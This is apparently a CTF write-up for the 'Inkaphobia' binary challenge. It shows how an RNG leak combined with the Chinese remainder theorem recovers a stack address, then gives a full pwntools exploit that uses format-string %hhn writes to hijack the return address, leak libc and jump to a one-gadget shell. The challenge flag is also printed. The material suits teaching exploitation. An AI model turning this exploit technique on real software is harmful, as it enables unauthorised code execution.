# Inkaphobia

## Task

Seems that random.org limits how much entropy you can use per day. So why not reuse entropy?

* [inkaphobia](https://imaginaryctf.org/r/505D-inkaphobia)
* [libc.so.6](https://imaginaryctf.org/r/D39E-libc.so.6)
* nc chal.imaginaryctf.org 42008

## Solution

When we open the binary, we see that it protects some
relocation stuff; we also see that we have full RELRO.
This just means that we can't overwrite stuff in the
GOT to call unintended functions that way. Next we see
that it initializes a random variable and then... Uses
the pointer to that in another function to print a random
number below the value you entered.

Lastly back in the main function there's a printf
exploit possible with user input printed out. We can exploit
that by overwriting one byte at a time with the `%hhn` modifier
and by using the correct address (Which can be in our string,
so we can write wherever we want).

Sadly this write-anything-anywhere is relatively useless.
Even though the binary doesn't have PIE, we can't overwrite
anything in it's address space because of the RELRO. This
means we first need to find either the libc base address
to overwrite something like the on exit hook or similar or
we have to find the stack address (because we need a pointer
to where we want to write, we can't simply do `%5$hhn` and
expect it to write at the fifth word on the stack, because
it takes the address there and writes to wherever that points)

We are lucky because the binary leaks information about the stack
pointer as the random variable is not the value from the rand()
function but actually the pointer to it. Sadly we can only get that
value modulo a value between 1 and 0x7f. Luckily for us there
is the ever so useful chinese remainder theorem coming to the
rescue. So we get the remainder modulo some prime numbers
(They could also be other numbers as long as they are relative
coprime). I chose to go with the only prime variant, so I ended
up using `[0x7F, 0x71, 0x6D, 0x6B, 0x67, 0x65]`. Going through
all these values and then using the chinese remainder theorem
will give us a unique value from 0 to 0x0195682d1ec3. However
we know that the stack address will be at 0x7ff000000000 or higher.
Luckily we see that if we add the product of the primes we
will get a unique value in the range 0x7ff000000000 to
0x800000000000, which means we can just add the value
until we are in that range.

My somewhat ugly code for this whole procedure looks like this:

```python
    io.recvuntil(b"RNG service!")
    nums = [0x7F, 0x71, 0x6D, 0x6B, 0x67, 0x65]
    prod = 1741209542339
    rem = []

    for i in range(6):
        io.sendline(str(nums[i]).encode())
        io.recvuntil(b"number: ")
        rem.append(int(io.recvline()))

    print(rem)
    s = 0
    for r,mi in zip(rem, nums):
        Mi = prod // mi
        s += r * pow(Mi, -1, mi) * Mi
    s = s%prod
    while s < 0x7ff000000000:
        s += prod
```

After this we have the pointer to the stack variable in s,
so we can subtract a bit from it to get a pointer to the
return address on the stack. Next we can use our 
write-anything-anywhere primitive to overwrite the return
address such that we return to the main function itself.

We also include a format string part which leaks the actual
return address (Before we overwrite it), such that we get
a pointer into `__libc_start_main` from which we can calculate
the libc base address.

In the second iteration of the main function we don't need to
leak anything technically since we know that the stack pointer
will just be 16 greater than before (Because we popped the return
address and rbp). So now we just need to overwrite the return address
with the address of a onegadget in libc (Which luckily there
is one which works well at offset 0xe6c81)

So the final exploit looks like this:

```python
libc = ELF("./libc.so(1).6")
onegadget = 0xe6c81

def addr_to_increments(target_addr):
    tgt = [target_addr&0xFF]            # first byte is just the lowest byte of the address
    if tgt[0] == 0: tgt[0] = 256        # if its zero, we don't want 0 since we can't print that many characters
    for i in range(7):                  # for the rest of the bytes
        prev = target_addr&0xFF         # we get the previous byte (current counter value)
        target_addr >>= 8               # shift the target by 8 so we can...
        n = (target_addr - prev) & 0xFF # get the next byte, subtract the previous from it (to get the increment we need)
        if n == 0: n = 256              # we always print at least one zero, so print 256 instead
        tgt.append(n)                   # append the byte
    tgt[0] -= 18                        # Our payload will print a pointer first, to ensure everything's good, I made that 18 chars
    return tgt

def craft_payload(tgt):
    payload = b"%75$18p"                    # print the return address (the one which we haven't overwritten yet)
    payload += b"".join([f"%48${tgt[i]}d%{40+i}$hhn".encode() for i in range(8)])   # overwrite each byte, the addresses start
                                                                                    # after 0x100 bytes, which means %32$ after
                                                                                    # the start of the string which starts %8$
                                                                                    # So a total of 40+i for each address
    assert(len(payload) <= 0x100)           # make sure we aren't over the limit
    payload += cyclic(0x100 - len(payload)) # fill up to 0x100 bytes
    for i in range(8):
        payload += p64(s+i) # %40$-%47$     # the addresses of each byte in the return address
    payload += p64(0)                       # the value we print, we don't want a random value here, 
                                            # since we want accurate control over the
                                            # amount of bytes printed
    return payload


io = start()

# Calculate the stack address based on the leaks using CRT
io.recvuntil(b"RNG service!")
nums = [0x7F, 0x71, 0x6D, 0x6B, 0x67, 0x65]
prod = 1741209542339
rem = []
for i in range(6):
    io.sendline(str(nums[i]).encode())
    io.recvuntil(b"number: ")
    rem.append(int(io.recvline()))
info("Got some remainders: %s", str(rem))
s = 0
for r,mi in zip(rem, nums):             # oh look it's my very ugly CRT implementation
    Mi = prod // mi
    s += r * pow(Mi, -1, mi) * Mi
s = s%prod
while s < 0x7ff000000000:               # make sure we're in stack range
    s += prod

s += 0x21C                              # address to the end of stack ==> return address
info("Found the stack address: %x", s)

target_addr = 0x400978 # main
tgt = addr_to_increments(target_addr)   # calculate how much we need to increase a counter for each byte
io.recvline()
payload = craft_payload(tgt)            # craft the payload

io.sendline(payload)
info("waiting...")
io.recvuntil(b", ")
io.recvuntil(b"x")
x = int(io.recvuntil(b" "),16)
libc.address = (x - libc.sym.__libc_start_main) & ~0xFFF
info("Libc base at: %x", (libc.address))

# Now do it again

io.recvuntil(b"RNG service!")
for i in range(6): io.sendline(b"1") # waste the RNG
io.recvuntil(b"name?")

s += 16                                 # we popped two things from the stack, thus it will be increased by 16
target_addr = (0xe6c81 + libc.address)  # the onegadget address
tgt = addr_to_increments(target_addr)   # recalculate the increments
payload = craft_payload(tgt)            # craft the payload

io.sendline(payload)
io.recvuntil(b"\x7f")

io.interactive()
```

Read the flag.txt and we get

`ictf{th3_3ntr0py_th13f_str1k3s!_38ba8f19}`
